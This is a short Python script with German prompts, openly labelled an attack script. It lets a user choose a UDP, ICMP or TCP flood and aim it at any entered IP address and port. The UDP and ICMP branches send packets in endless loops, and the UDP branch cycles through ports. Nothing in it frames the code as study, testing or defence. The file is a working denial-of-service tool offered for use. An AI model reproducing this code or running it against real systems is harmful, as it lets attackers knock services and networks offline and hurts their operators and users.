# -*- coding: utf-8 -*-
import os
import sys
import time
import socket
import random
from scapy.all import IP, ICMP, send
from datetime import datetime

# Code Time
now = datetime.now()

# Daten für Pakete
udp_bytes = random._urandom(1490)

# Begrüßung
os.system("clear")
os.system("figlet Attack Script")
print("Willkommen zum Angriffsskript!")
print("Bitte wählen Sie eine Angriffsmethode:")
print("1 - UDP Flood")
print("2 - ICMP Flood")
print("3 - TCP Flood")

# Auswahl der Methode
method = input("Wähle die Angriffsmethode (1/2/3): ")
ip = input("Ziel-IP-Adresse: ")
port = int(input("Port (nur für UDP und TCP relevant, z. B. 80): "))

# Angriffsmethoden
if method == "1":
    # UDP Flood
    print("Starte UDP-Flood...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        sock.sendto(udp_bytes, (ip, port))
        sent += 1
        port = port + 1 if port < 65534 else 1
        print(f"Gesendet {sent} Pakete an {ip} über Port {port}")

elif method == "2":
    # ICMP Flood
    print("Starte ICMP-Flood...")
    sent = 0
    while True:
        icmp_packet = IP(dst=ip)/ICMP()/"ICMP Flood Data"
        send(icmp_packet, verbose=False)
        sent += 1
        print(f"Gesendet {sent} ICMP-Pakete an {ip}")

elif method == "3":
    # TCP Flood
    print("Starte TCP-Flood...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sent = 0
    try:
        while True:
            try:
                sock.connect((ip, port))
                sock.send(random._urandom(1024))
                sent += 1
                print(f"Gesendet {sent} TCP-Pakete an {ip} über Port {port}")
            except Exception as e:
                print(f"Verbindung fehlgeschlagen: {e}")
                break
    except KeyboardInterrupt:
        sock.close()
        print("TCP-Flood beendet.")

else:
    print("Ungueltige Auswahl. Das Programm wird beendet.")
